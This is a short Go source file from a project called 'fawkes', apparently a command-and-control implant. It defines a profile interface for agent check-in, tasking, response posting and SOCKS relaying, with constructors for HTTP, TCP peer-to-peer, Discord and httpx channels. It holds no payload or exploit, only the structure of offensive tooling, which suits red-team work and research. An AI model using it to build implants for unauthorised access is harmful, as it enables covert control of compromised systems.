package profiles

import (
	"fawkes/pkg/discord"
	"fawkes/pkg/http"
	"fawkes/pkg/httpx"
	"fawkes/pkg/structs"
	"fawkes/pkg/tcp"
)

// Profile interface defines the C2 profile methods
type Profile interface {
	Checkin(agent *structs.Agent) error
	GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error)
	PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error)
	GetCallbackUUID() string
}

// NewProfile creates a new profile based on the HTTP profile
func NewProfile(httpProfile *http.HTTPProfile) Profile {
	return httpProfile
}

// NewTCPProfile creates a new profile based on the TCP P2P profile
func NewTCPProfile(tcpProfile *tcp.TCPProfile) Profile {
	return tcpProfile
}

// NewDiscordProfile creates a new profile based on the Discord C2 profile
func NewDiscordProfile(discordProfile *discord.DiscordProfile) Profile {
	return discordProfile
}

// NewHTTPXProfile creates a new profile based on the httpx C2 profile
func NewHTTPXProfile(httpxProfile *httpx.HTTPXProfile) Profile {
	return httpxProfile
}
